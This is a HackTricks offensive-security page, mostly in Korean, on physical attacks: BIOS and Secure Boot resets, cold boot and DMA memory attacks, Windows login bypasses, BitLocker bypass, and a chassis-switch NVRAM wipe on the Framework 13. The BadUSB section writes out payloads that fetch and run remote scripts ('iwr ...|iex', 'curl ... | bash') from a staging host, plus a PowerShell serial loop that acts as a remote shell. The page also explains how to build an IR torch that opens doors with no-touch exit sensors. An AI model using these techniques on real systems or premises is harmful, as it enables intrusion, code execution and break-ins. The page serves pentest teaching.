# 물리적 공격

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**Resetting the BIOS**은 여러 가지 방법으로 수행할 수 있습니다. 대부분의 메인보드에는 **배터리**가 포함되어 있으며, 이를 약 **30분** 정도 제거하면 암호를 포함한 BIOS 설정이 초기화됩니다. 대안으로는 **메인보드의 점퍼**를 조정하여 특정 핀을 연결함으로써 이러한 설정을 초기화할 수 있습니다.

하드웨어 조정이 불가능하거나 실용적이지 않은 상황에서는 **소프트웨어 도구**가 해결책이 될 수 있습니다. **Kali Linux**와 같은 배포판의 **Live CD/USB**로 시스템을 부팅하면 **_killCmos_**와 **_CmosPWD_** 같은 도구에 접근할 수 있어 BIOS 암호 복구에 도움이 됩니다.

BIOS 암호를 모르는 경우, 틀리게 입력하면 보통 **세 번** 입력 후 오류 코드가 발생합니다. 이 오류 코드는 [https://bios-pw.org](https://bios-pw.org) 같은 웹사이트에 입력해 사용 가능한 암호를 얻는 데 활용될 수 있습니다.

### UEFI Security

전통적인 BIOS 대신 **UEFI**를 사용하는 최신 시스템에서는 **chipsec** 도구를 사용하여 UEFI 설정을 분석하고 수정할 수 있으며, **Secure Boot** 비활성화 같은 작업도 가능합니다. 다음 명령으로 수행할 수 있습니다:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM은 전원이 차단된 후에도 짧게 데이터가 유지되며, 보통 **1 to 2 minutes** 정도 지속됩니다. 액체 질소 같은 차가운 물질을 사용하면 이 지속 시간을 **10 minutes**까지 연장할 수 있습니다. 이 연장된 기간 동안 **memory dump**를 생성하여 **dd.exe**, **volatility**와 같은 도구로 분석할 수 있습니다.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION**은 DMA를 통해 물리적 메모리를 조작하도록 설계된 도구로, **FireWire**나 **Thunderbolt** 같은 인터페이스와 호환됩니다. 메모리를 패치해 어떤 비밀번호든 통과하도록 만들어 로그인 절차를 우회할 수 있습니다. 다만 **Windows 10** 시스템에는 효과적이지 않습니다.

---

## Live CD/USB for System Access

**_sethc.exe_**나 **_Utilman.exe_** 같은 시스템 바이너리를 **_cmd.exe_** 복사본으로 교체하면 시스템 권한의 명령 프롬프트를 얻을 수 있습니다. **chntpw** 같은 도구로 Windows 설치의 **SAM** 파일을 편집해 비밀번호를 변경할 수도 있습니다.

**Kon-Boot**은 Windows 커널이나 UEFI를 일시적으로 수정하여 비밀번호를 모르는 상태에서도 Windows에 로그인할 수 있게 해주는 도구입니다. 자세한 내용은 [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/)에서 확인할 수 있습니다.

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: BIOS 설정에 접근합니다.
- **F8**: Recovery 모드로 진입합니다.
- Windows 배너 이후에 **Shift**를 누르면 autologon을 우회할 수 있습니다.

### BAD USB Devices

**Rubber Ducky**, **Teensyduino** 같은 장치는 **bad USB** 장치를 만들기 위한 플랫폼으로, 대상 컴퓨터에 연결되면 미리 정의된 페이로드를 실행할 수 있습니다.

### Volume Shadow Copy

관리자 권한을 통해 PowerShell로 **SAM** 파일을 포함한 민감한 파일의 복사본을 생성할 수 있습니다.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **ESP32-S3** 기반 임플란트(예: **Evil Crow Cable Wind**)는 USB-A→USB-C 또는 USB-C↔USB-C 케이블 안에 숨겨져 순수하게 USB 키보드로만 열거되며, C2 스택을 Wi-Fi로 노출합니다. 운영자는 피해자 호스트에서 케이블에 전원만 공급하면 되고, `Evil Crow Cable Wind`라는 이름의 핫스팟(password: `123456789`)을 만든 뒤 [http://cable-wind.local/](http://cable-wind.local/) (또는 할당된 DHCP 주소)로 접속해 내장 HTTP 인터페이스에 접근하면 됩니다.
- 브라우저 UI에는 *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, *Config* 탭이 제공됩니다. 저장된 페이로드는 OS별로 태깅되며, 키보드 레이아웃은 실시간으로 전환되고 VID/PID 문자열을 변경해 알려진 주변기기를 흉내 낼 수 있습니다.
- C2가 케이블 내부에 있으므로, 폰으로 페이로드를 준비하고 실행을 트리거하며 Wi-Fi 자격증명을 관리할 수 있어 호스트 OS에 접근하지 않고도 짧은 침투 시간에 유리합니다.

### OS-aware AutoExec payloads

- AutoExec 규칙은 USB 열거 직후 하나 이상의 페이로드를 즉시 실행하도록 바인딩합니다. 임플란트는 가벼운 OS 지문 인식을 수행해 일치하는 스크립트를 선택합니다.
- 예시 워크플로우:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) 또는 `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- 실행이 무인으로 이루어지기 때문에 단순히 충전 케이블을 교체하는 것만으로도 로그인된 사용자 컨텍스트에서 “plug-and-pwn” 초기 접근을 달성할 수 있습니다.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** 저장된 페이로드가 콘솔을 열고 새 USB 직렬 장치로 들어오는 내용을 실행하는 루프를 붙여넣습니다. 최소한의 Windows 변형은 다음과 같습니다:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** 임플란트는 USB CDC 채널을 열린 상태로 유지하는 동안 ESP32-S3가 operator 쪽으로 TCP client (Python script, Android APK, or desktop executable)를 실행합니다. TCP session에 입력된 바이트는 위의 serial 루프에 전달되어 air-gapped 호스트에서도 remote command execution을 제공합니다. 출력이 제한적이어서 운영자는 보통 blind commands (account creation, staging additional tooling, etc.)를 실행합니다.

### HTTP OTA update surface

- 동일한 web stack은 보통 인증되지 않은 firmware 업데이트를 노출합니다. Evil Crow Cable Wind는 `/update`를 리스닝하고 업로드된 바이너리를 그대로 플래시합니다:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- 현장 운영자는 케이블을 열지 않고도 교전 중간에 기능을 hot-swap할 수 있으며(예: USB Army Knife 펌웨어를 flash), implant가 대상 호스트에 계속 연결된 상태에서 새로운 기능으로 전환할 수 있다.

## BitLocker 암호화 우회

BitLocker 암호화는 메모리 덤프 파일(**MEMORY.DMP**) 내에서 **recovery password**가 발견될 경우 잠재적으로 우회될 수 있다. 이 목적을 위해 **Elcomsoft Forensic Disk Decryptor** 또는 **Passware Kit Forensic** 같은 도구를 사용할 수 있다.

---

## 복구 키 추가를 위한 소셜 엔지니어링

새 BitLocker 복구 키는 소셜 엔지니어링 전술을 통해 추가할 수 있다. 사용자가 모든 값이 0으로 구성된 새 복구 키를 추가하는 명령을 실행하도록 설득하면 복호화 과정이 단순화된다.

---

## Chassis Intrusion / Maintenance Switches를 이용해 BIOS를 공장 초기화로 되돌리기

많은 최신 노트북 및 소형 데스크탑에는 Embedded Controller(EC)와 BIOS/UEFI firmware에서 모니터링하는 **chassis-intrusion switch**가 포함되어 있다. 스위치의 주 목적은 장치가 열렸을 때 경고를 발생시키는 것이지만, 벤더는 때때로 스위치를 특정 패턴으로 토글할 때 트리거되는 **undocumented recovery shortcut**을 구현하기도 한다.

### 공격 작동 방식

1. 스위치는 EC의 **GPIO interrupt**에 연결되어 있다.
2. EC에서 실행되는 펌웨어는 **timing and number of presses**를 추적한다.
3. 하드코딩된 패턴이 인식되면 EC는 *mainboard-reset* 루틴을 호출하여 시스템 **NVRAM/CMOS의 내용을 삭제**한다.
4. 다음 부팅 시 BIOS는 기본값을 로드한다 – **supervisor password, Secure Boot keys, 및 모든 사용자 정의 설정이 초기화된다**.

> Secure Boot가 비활성화되고 firmware password가 사라지면, 공격자는 단순히 외부 OS 이미지를 부팅하여 내부 드라이브에 대한 무제한 접근 권한을 얻을 수 있다.

### 실사용 사례 – Framework 13 Laptop

Framework 13(11th/12th/13th-gen)에 대한 recovery shortcut은 다음과 같다:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
After the tenth cycle the EC sets a flag that instructs the BIOS to wipe NVRAM at the next reboot.  The whole procedure takes ~40 s and requires **nothing but a screwdriver**.

### Generic Exploitation Procedure

1. Power-on or suspend-resume the target so the EC is running.
2. Remove the bottom cover to expose the intrusion/maintenance switch.
3. Reproduce the vendor-specific toggle pattern (consult documentation, forums, or reverse-engineer the EC firmware).
4. Re-assemble and reboot – firmware protections should be disabled.
5. Boot a live USB (e.g. Kali Linux) and perform usual post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).

### Detection & Mitigation

* Log chassis-intrusion events in the OS management console and correlate with unexpected BIOS resets.
* Employ **tamper-evident seals** on screws/covers to detect opening.
* Keep devices in **physically controlled areas**; assume that physical access equals full compromise.
* Where available, disable the vendor “maintenance switch reset” feature or require an additional cryptographic authorisation for NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).
- A plastic shroud blocks the emitter and receiver from looking directly at each other, so the controller assumes any validated carrier came from a nearby reflection and drives a relay that opens the door strike.
- Once the controller believes a target is present it often changes the outbound modulation envelope, but the receiver keeps accepting any burst that matches the filtered carrier.

### Attack Workflow
1. **Capture the emission profile** – clip a logic analyser across the controller pins to record both the pre-detection and post-detection waveforms that drive the internal IR LED.
2. **Replay only the “post-detection” waveform** – remove/ignore the stock emitter and drive an external IR LED with the already-triggered pattern from the outset. Because the receiver only cares about pulse count/frequency, it treats the spoofed carrier as a genuine reflection and asserts the relay line.
3. **Gate the transmission** – transmit the carrier in tuned bursts (e.g., tens of milliseconds on, similar off) to deliver the minimum pulse count without saturating the receiver’s AGC or interference handling logic. Continuous emission quickly desensitises the sensor and stops the relay from firing.

### Long-Range Reflective Injection
- Replacing the bench LED with a high-power IR diode, MOSFET driver, and focusing optics enables reliable triggering from ~6 m away.
- The attacker does not need line-of-sight to the receiver aperture; aiming the beam at interior walls, shelving, or door frames that are visible through glass lets reflected energy enter the ~30° field of view and mimics a close-range hand wave.
- Because the receivers expect only weak reflections, a much stronger external beam can bounce off multiple surfaces and still remain above the detection threshold.

### Weaponised Attack Torch
- Embedding the driver inside a commercial flashlight hides the tool in plain sight. Swap the visible LED for a high-power IR LED matched to the receiver’s band, add an ATtiny412 (or similar) to generate the ≈30 kHz bursts, and use a MOSFET to sink the LED current.
- A telescopic zoom lens tightens the beam for range/precision, while a vibration motor under MCU control gives haptic confirmation that modulation is active without emitting visible light.
- Cycling through several stored modulation patterns (slightly different carrier frequencies and envelopes) increases compatibility across rebranded sensor families, letting the operator sweep reflective surfaces until the relay audibly clicks and the door releases.

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
